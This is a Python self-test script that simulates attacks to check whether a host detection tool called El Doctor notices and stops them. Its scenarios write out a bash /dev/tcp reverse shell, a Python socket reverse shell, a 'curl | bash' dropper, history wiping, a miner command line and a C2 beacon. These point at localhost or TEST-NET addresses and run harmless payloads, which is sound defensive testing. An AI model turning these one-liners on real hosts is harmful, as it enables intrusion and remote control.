#!/usr/bin/env python3
"""Harmless attack simulations (purple-team self-test) for El Doctor.

Each scenario starts a *real* process that behaves like a threat (burning CPU,
mining-style command line, reverse shell to localhost, fork storm, fileless
tricks, C2 beacon to a threat-intel IP, SSH brute force over syslog ...).
Nothing is destructive: payloads are sleep loops and sockets to 127.0.0.1 or
TEST-NET (RFC 5737) addresses.

The script waits for El Doctor (running in another process on the same
ELDOCTOR_HOME) to detect and respond, then prints a scorecard built from
El Doctor's own database.

    python3 scripts/simulate_attacks.py prepare            # build sim binaries + lab feeds
    python3 scripts/simulate_attacks.py run [--only a,b]   # run scenarios, print scorecard
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from eldoctor.storage import Store  # noqa: E402

SIM = Path(os.environ.get("ELDOCTOR_SIM_DIR", "/tmp/eldoctor-sim"))
FEEDS = SIM / "feeds"
C2_IP = "203.0.113.66"         # TEST-NET-3, listed in the lab Feodo-format feed
BRUTE_IP = "203.0.113.50"      # TEST-NET-3, used by the SSH brute-force simulation
SYSLOG_PORT = int(os.environ.get("ELDOCTOR_SYSLOG_PORT", "5514"))
AUTH_LOG = SIM / "auth.log"

SLEEPER_C = r"""
#include <stdio.h>
#include <unistd.h>
/* El Doctor simulation payload - does nothing but sleep. */
static const char marker[] = "ELDOCTOR-SIM-" MARKER;
int main(int argc, char **argv) { (void)argc; (void)argv; volatile const char *m = marker; (void)m;
  for (int i = 0; i < 600; i++) sleep(1); return 0; }
"""


def build_sleeper(name: str, marker: str) -> Path:
    src = SIM / f"{name}.c"
    src.write_text(SLEEPER_C)
    out = SIM / name
    subprocess.run(["gcc", "-O0", f'-DMARKER="{marker}"', "-o", str(out), str(src)], check=True)
    src.unlink()
    return out


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def prepare() -> None:
    SIM.mkdir(parents=True, exist_ok=True)
    FEEDS.mkdir(exist_ok=True)
    build_sleeper("sleeper", "generic")
    payload = build_sleeper("payload-ioc.bin", "ioc-hash-sample")
    # Feodo Tracker / MalwareBazaar style feeds (served by mock_receivers.py --files)
    (FEEDS / "ipblocklist.txt").write_text(
        "################################################################\n"
        "# abuse.ch Feodo Tracker Botnet C2 IP Blocklist (LAB COPY)     #\n"
        "################################################################\n"
        f"{C2_IP}\n198.51.100.23\n192.0.2.77\n")
    (FEEDS / "sha256_recent.txt").write_text(
        "################################################################\n"
        "# MalwareBazaar recent malware samples (SHA256 hashes) LAB COPY #\n"
        "################################################################\n"
        f"{sha256(payload)}\n" + "0" * 63 + "1\n")
    (FEEDS / "payload.sh").write_text("# simulated second stage (harmless): keeps running like an implant\n"
                                      "for i in $(seq 1 60); do sleep 2; done\n")
    AUTH_LOG.touch()
    print(f"prepared {SIM}: sleeper, payload-ioc.bin (sha256 {sha256(payload)[:16]}...), lab feeds")


# --------------------------------------------------------------------------- scenario helpers
class Listener(threading.Thread):
    """Plays the attacker's netcat listener on 127.0.0.1:4444."""

    def __init__(self, port: int = 4444) -> None:
        super().__init__(daemon=True)
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", port))
        self.srv.listen(5)
        self.conns: List[socket.socket] = []

    def run(self) -> None:
        while True:
            try:
                c, _ = self.srv.accept()
                self.conns.append(c)
                c.sendall(b"id\n")
            except OSError:
                return


def popen(cmd, **kw) -> subprocess.Popen:
    return subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **kw)


def logger(msg: str, tag: str = "sshd") -> None:
    """Send a real syslog datagram with util-linux logger (RFC 5424) to El Doctor's listener."""
    subprocess.run(["logger", "-n", "127.0.0.1", "-P", str(SYSLOG_PORT), "-d", "--rfc5424", "-t", tag,
                    "-p", "auth.info", msg], check=True)


def append_auth_log(msg: str, prog: str = "sshd", pid: int = 4242) -> None:
    ts = time.strftime("%b %e %H:%M:%S")
    with open(AUTH_LOG, "a") as fh:
        fh.write(f"{ts} labhost {prog}[{pid}]: {msg}\n")


# --------------------------------------------------------------------------- scenarios
def sc_cpu_hog():
    return popen([sys.executable, "-c", "while True: pass"]), "Runaway CPU process (python busy loop)"


def sc_memory_hog():
    # a leak that grows 64 MB at a time (page faults are slow in this VM, so pace it to stay below the CPU rule)
    # page faults are slow and variable in this VM (10-60 MB/s): grow in 32 MB steps with pauses so the
    # process looks like a leak, not a CPU hog
    code = ("import time\nleak = []\nwhile True:\n    leak.append(b'x' * (32 * 1024**2))\n"
            "    time.sleep(2 if len(leak) < 16 else 5)")
    return popen([sys.executable, "-c", code]), "Memory leak growing in 32 MB steps"


def sc_cryptominer():
    miner = SIM / "xmrig"
    shutil.copy(SIM / "sleeper", miner)
    os.chmod(miner, 0o755)
    cmd = [str(miner), "--donate-level", "1", "-o", "stratum+tcp://pool.supportxmr.com:3333", "-u",
           "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
           "--cpu-max-threads-hint", "50"]
    return popen(cmd), "XMRig-style miner from /tmp (name + stratum command line)"


def sc_reverse_shell_bash():
    return (popen(["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]),
            "bash reverse shell to 127.0.0.1:4444")


def sc_reverse_shell_python():
    code = ("import socket,subprocess,os;s=socket.socket();s.connect(('127.0.0.1',4444));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
    return popen(["python3", "-c", code]), "python socket/dup2 reverse shell spawning /bin/sh"


def sc_download_exec():
    return (popen(["bash", "-c", "curl -s http://127.0.0.1:8099/payload.sh | bash"]),
            "curl | bash dropper with long-running second stage")


def sc_fork_storm():
    code = ("import subprocess,time\nkids=[subprocess.Popen(['sleep','300']) for _ in range(45)]\n"
            "time.sleep(300)")
    return popen([sys.executable, "-c", code]), "spawn storm (45 children in ~1s)"


def sc_deleted_binary():
    exe = SIM / "kdevtmp-updater"
    shutil.copy(SIM / "sleeper", exe)
    os.chmod(exe, 0o755)
    p = popen([str(exe)])
    time.sleep(0.3)
    exe.unlink()                       # anti-forensics: remove the binary while it runs
    return p, "binary deleted from disk after launch (/tmp)"


def sc_masquerade():
    return (popen(["bash", "-c", f'exec -a "[kworker/0:1H]" {SIM / "sleeper"}']),
            "userland process named like a kernel thread")


def sc_ioc_hash():
    return popen([str(SIM / "payload-ioc.bin")]), "binary whose SHA-256 is in the MalwareBazaar-format feed"


def sc_c2_beacon():
    code = (f"import socket,time\ns=socket.create_connection(('{C2_IP}',443),timeout=5)\n"
            "while True: time.sleep(1)")
    return popen([sys.executable, "-c", code]), f"beacon to Feodo-listed C2 {C2_IP}:443"


def sc_log_tamper():
    return (popen(["bash", "-c", "unset HISTFILE; history -c; while true; do sleep 5; done"]),
            "history tampering inside a persistent loop script")


def sc_ssh_bruteforce():
    for i in range(6):
        logger(f"Failed password for invalid user admin{i} from {BRUTE_IP} port {40000 + i} ssh2")
        time.sleep(0.1)
    time.sleep(2.5)
    logger(f"Accepted password for root from {BRUTE_IP} port 40100 ssh2")
    return None, f"SSH brute force from {BRUTE_IP} via syslog (logger RFC5424) + success"


def sc_auth_log_file():
    for _ in range(3):
        append_auth_log("pam_unix(sudo:auth): authentication failure; logname=user_two uid=1001 euid=0 tty=/dev/pts/1 "
                        "ruser=user_two rhost=  user=user_two", prog="sudo")
    append_auth_log("new user: name=backd00r, UID=1002, GID=1002, home=/home/backd00r, shell=/bin/bash", prog="useradd")
    return None, "auth.log tail: sudo failures + new account"


def sc_blocked_ip_connect():
    code = (f"import socket,time\ns=socket.create_connection(('{BRUTE_IP}',22),timeout=5)\n"
            "while True: time.sleep(1)")
    return popen([sys.executable, "-c", code]), f"process connecting to blocked IP {BRUTE_IP}"


SCENARIOS: Dict[str, Dict[str, Any]] = {
    "cpu_hog": {"fn": sc_cpu_hog, "expect": ["ED-RES-001"], "timeout": 30},
    "memory_hog": {"fn": sc_memory_hog, "expect": ["ED-RES-002"], "timeout": 90},
    "cryptominer": {"fn": sc_cryptominer, "expect": ["ED-IOC-003", "SIGMA:8e7d6c5b-4a39-4281-9f0e-3b4c5d6e7f04"],
                    "timeout": 20},
    "reverse_shell_bash": {"fn": sc_reverse_shell_bash, "expect": ["ED-NET-001", "SIGMA:6b3f0a52-1c1e-4d5f-9a51-0c7c8e0f9a01"],
                           "timeout": 20, "listener": True},
    "reverse_shell_python": {"fn": sc_reverse_shell_python, "expect": ["SIGMA:6b3f0a52-1c1e-4d5f-9a51-0c7c8e0f9a01",
                                                                       "ED-NET-001"], "timeout": 20, "listener": True},
    "download_exec": {"fn": sc_download_exec, "expect": ["SIGMA:2f9b8a4e-8d8e-4d62-9c4a-1e2c3b4d5e02"], "timeout": 20},
    "fork_storm": {"fn": sc_fork_storm, "expect": ["ED-RES-003"], "timeout": 25},
    "deleted_binary": {"fn": sc_deleted_binary, "expect": ["ED-PROC-002"], "timeout": 20},
    "masquerade": {"fn": sc_masquerade, "expect": ["ED-PROC-003"], "timeout": 20},
    "ioc_hash": {"fn": sc_ioc_hash, "expect": ["ED-IOC-001"], "timeout": 20},
    "c2_beacon": {"fn": sc_c2_beacon, "expect": ["ED-IOC-002"], "timeout": 20},
    "log_tamper": {"fn": sc_log_tamper, "expect": ["SIGMA:1a2b3c4d-5e6f-4071-8a9b-0c1d2e3f4a05"], "timeout": 20},
    "ssh_bruteforce": {"fn": sc_ssh_bruteforce, "expect": ["ED-LOG-001", "ED-LOG-002"], "timeout": 10},
    "auth_log_file": {"fn": sc_auth_log_file, "expect": ["ED-LOG-003", "ED-LOG-004"], "timeout": 10},
    "blocked_ip_connect": {"fn": sc_blocked_ip_connect, "expect": ["ED-NET-003"], "timeout": 20},
}


# --------------------------------------------------------------------------- runner
def alerts_for(store: Store, since: float, pids: List[int], ips: List[str]) -> List[Dict[str, Any]]:
    rows = store.query("SELECT * FROM alerts WHERE ts >= ? ORDER BY ts", (since,))
    out = []
    for r in rows:
        d = json.loads(r["data"])
        proc = d.get("process") or {}
        if (proc.get("pid") in pids) or (r["remote_ip"] and r["remote_ip"] in ips) or (
                not proc and not r["remote_ip"] and r["source"] == "log"):
            out.append(d)
    return out


def children_of(pid: int) -> List[int]:
    try:
        import psutil
        return [c.pid for c in psutil.Process(pid).children(recursive=True)]
    except Exception:
        return []


def run_scenarios(names: List[str], expect_outcome: str = "killed") -> int:
    store = Store()
    listener = None
    results = []
    for name in names:
        sc = SCENARIOS[name]
        if sc.get("listener") and listener is None:
            listener = Listener()
            listener.start()
        t0 = time.time()
        proc, desc = sc["fn"]()
        pids = [proc.pid] if proc else []
        ips = [C2_IP, BRUTE_IP] if name in ("c2_beacon", "ssh_bruteforce", "blocked_ip_connect") else []
        time.sleep(0.5)
        if proc:
            pids += children_of(proc.pid)
        outcome, rc = "n/a (log event)", None
        detect_at = None
        deadline = t0 + sc["timeout"]
        while time.time() < deadline:
            found = alerts_for(store, t0 - 0.5, pids, ips)
            if found and detect_at is None:
                detect_at = min(a["timestamp"] for a in found)
            if proc is not None:
                rc = proc.poll()
                if rc is not None:
                    break
                if expect_outcome == "alive" and detect_at and time.time() - detect_at > 4:
                    break
            elif found and {a["rule_id"] for a in found} >= set(sc["expect"]):
                time.sleep(1.5)
                break
            time.sleep(0.25)
        if proc is not None:
            rc = proc.poll()
            if rc is None:
                outcome = "ALIVE"
                try:
                    import psutil
                    st = psutil.Process(proc.pid).status()
                    outcome = f"ALIVE ({st})"
                except Exception:
                    pass
                for pid in [proc.pid] + children_of(proc.pid):
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except OSError:
                        pass
                proc.wait()
            else:
                outcome = f"terminated ({signal.Signals(-rc).name})" if rc < 0 else f"exited rc={rc}"
        time.sleep(3.0)   # let the playbook finish writing its remaining steps (notify, block_ip ...)
        found = alerts_for(store, t0 - 0.5, pids, ips)
        rules = sorted({a["rule_id"] for a in found})
        mitre = sorted({m for a in found for m in a.get("mitre", [])})
        acts = []
        for a in found:
            for act in store.list_actions(alert_id=a["id"]):
                acts.append(f"{act['action']}:{act['status']}")
        detected = any(r in rules for r in sc["expect"])
        ok = detected and (proc is None or (expect_outcome == "killed") == outcome.startswith("terminated"))
        results.append({"scenario": name, "desc": desc, "detected": detected, "rules": rules, "mitre": mitre,
                        "actions": list(dict.fromkeys(acts)), "outcome": outcome, "ok": ok,
                        "ttd": round(detect_at - t0, 1) if detect_at else None,
                        "ttr": round(time.time() - t0, 1)})
        print(f"[{'PASS' if ok else 'FAIL'}] {name:<21} detect={'yes' if detected else 'NO '} "
              f"t={results[-1]['ttd']}s outcome={outcome:<22} rules={','.join(r[:14] for r in rules)}", flush=True)
    print("\n================ El Doctor scorecard ================")
    for r in results:
        print(f"\n{'PASS' if r['ok'] else 'FAIL'}  {r['scenario']} - {r['desc']}")
        print(f"      detected in : {r['ttd']} s   process: {r['outcome']}")
        print(f"      rules       : {', '.join(r['rules']) or '-'}")
        print(f"      MITRE       : {', '.join(r['mitre']) or '-'}")
        print(f"      response    : {', '.join(r['actions']) or '-'}")
    passed = sum(r["ok"] for r in results)
    print(f"\n{passed}/{len(results)} scenarios passed")
    (SIM / f"scorecard-{int(time.time())}.json").write_text(json.dumps(results, indent=2))
    if listener:
        listener.srv.close()
    return 0 if passed == len(results) else 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["prepare", "run", "list"])
    ap.add_argument("--only", help="comma separated scenario names")
    ap.add_argument("--expect", choices=["killed", "alive"], default="killed",
                    help="expected outcome (alive for monitor mode)")
    args = ap.parse_args()
    if args.cmd == "prepare":
        prepare()
        return 0
    if args.cmd == "list":
        for k, v in SCENARIOS.items():
            print(f"{k:<22} expects {', '.join(v['expect'])}")
        return 0
    names = args.only.split(",") if args.only else list(SCENARIOS)
    return run_scenarios(names, args.expect)


if __name__ == "__main__":
    raise SystemExit(main())
